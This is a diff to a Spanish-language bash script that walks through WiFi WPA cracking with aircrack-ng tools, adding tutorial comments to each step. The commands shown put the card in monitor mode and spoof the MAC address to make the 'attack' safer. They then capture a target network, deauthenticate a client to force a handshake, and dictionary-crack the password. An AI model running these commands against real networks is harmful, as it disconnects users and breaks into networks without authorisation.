@@ -5,7 +5,8 @@
 
 #!/bin/bash
 
-# ¡¡Debes de ejecutar el programa siendo superusuario!!
+# ¡¡Debes de ejecutar el programa siendo superusuario!! [No hace falta estar conectado a
+# ninguna red para ejecutar este programa]
 
 monitor="mon0"
 usuario=$(whoami)
@@ -30,6 +31,12 @@ monitorMode(){
     sleep 2
 
     if [ "$value" = "1" ]; then
+
+      # Al habilitar el modo monitor, capturamos y escuchamos cualquier tipo de
+      # paquete que viaje por el aire. También capturamos no sólo a aquellos clientes
+      # que estén conectados a la red, también los no asociados a ninguna (con sus
+      # respectivas direcciones MAC).
+
       airmon-ng start $tarjetaRed
       value=2
       echo " "
@@ -40,6 +47,13 @@ monitorMode(){
       echo "Cambiando direccion MAC..."
       echo " "
       sleep 2
+
+      # A continuación vamos a cambiar nuestra dirección MAC, esto lo haremos para
+      # realizar el 'ataque' de manera más segura en modo monitor. Para ello, siempre
+      # que queramos realizar algún cambio en una interfaz, primero tenemos que darla
+      # de baja. Posteriormente, al realizar los cambios... esta tendrá que ser
+      # nuevamente dada de alta.
+
       macchanger -a mon0
       echo " "
       echo "Dando de alta la interfaz mon0"
@@ -49,6 +63,14 @@ monitorMode(){
       value=2
       echo "¡Terminado!"
       sleep 3
+
+      # Si quisiéramos comprobar que nuestra dirección MAC ha sido cambiada, podemos
+      # hacer uso del comando 'macchanger -s mon0'. Esta nos mostrará 2 direcciones MAC,
+      # una de ellas es la 'New MAC' que corresponde a la que el programa 'macchanger' nos
+      # ha asignado aleatoriamente, la otra es la 'Permanent MAC', que corresponde a aquella
+      # que nos volverá a ser otorgada una vez paremos el modo monitor, es decir... la misma
+      # que teníamos desde un principio.
+
     else
       echo " "
       echo "No es posible, ya estás en modo monitor"
@@ -65,6 +87,11 @@ monitorMode(){
 
 interfacesMode(){
 
+  # Si ya ha has iniciado el modo monitor, verás que ahora en vez de tener 3 interfaces,
+  # tienes 4, una de ellas siendo la 'mon0' correspondiente al modo monitor. Cuando la des
+  # de baja o realices algún cambio, esta opción te permitirá ver qué está ocurriendo con las
+  # interfaces.
+
   echo " "
   echo "Abriendo configuración de interfaz..."
   echo " "
@@ -76,12 +103,17 @@ interfacesMode(){
 }
 
 monitorDown(){
-  
+
   echo " "
   echo "Dando de baja el modo monitor..."
   echo " "
   sleep 2
   if [ "$value" = "2" ]; then
+
+    # Con este comando detienes por completo el modo monitor. Siempre que quieras
+    # volver a utilizarlo una vez parado, tendrás que volver a crearlo nuevamente
+    # a través de la opción 1.
+
     airmon-ng stop mon0
     echo " "
     echo "Interfaz mon0 dada de baja con éxito"
@@ -103,6 +135,14 @@ wifiScanner(){
     echo " "
     echo "Una vez carguen más o menos todas las redes, presiona Ctrl+C"
     sleep 4
+
+    # 'airodump-ng' nos permite analizar las redes disponibles a través de una
+    # interfaz que le especifiquemos, en nuestro caso 'mon0'. Podría resultar
+    # más simple hacer 'airodump-ng wlp2s0' con la propia tarjeta de red
+    # directamente y acceder al escaneo de redes Wifi... pero el programa mismo
+    # te avisará de que es necesario inicializar el modo monitor, de lo contrario
+    # no te será permitido el escaneo de redes.
+
     airodump-ng mon0
     echo " "
     echo -n "Red Wifi que quiere marcar como objetivo: "
@@ -132,7 +172,8 @@ wifiScanner(){
     sleep 7
 
     # El siguiente comando también podemos usarlo con la sintaxis: airodump-ng -c ' ' -w ' ' --bssid '$wifiMAC' mon0
-    # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC
+    # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC. Con esto lo que hacemos es
+    # centrarnos en el escaneo de una única red especificada pasada por parámetros, aislando el resto de redes.
 
     airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0
 
@@ -171,6 +212,12 @@ wifiPassword(){
   echo "Vamos a proceder a averiguar la contraseña"
   echo " "
   sleep 5
+
+  # La sintaxis de 'aircrack-ng' es -> "aircrack-ng -w rutaDiccionario rutaFichero". De todos los ficheros que
+  # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
+  # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
+  # carpeta de manera manual, puede que el nombre tenga ligeros cambios.
+
   aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
   sleep 10
 
@@ -205,6 +252,11 @@ macAttack(){
   echo "Cuando el minuto haya pasado, presione Ctrl+C para parar el proceso y desde una nueva terminal escoga la opción 7"
   echo " "
   sleep 13
+
+  # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
+  # a que se genere el Handshake. El Handshake se genera en el momento en el que el usuario se vuelve a reconectar
+  # a la red (esto no siempre es así, pero por fines prácticos... diremos que es así).
+  
   aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
 
   # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
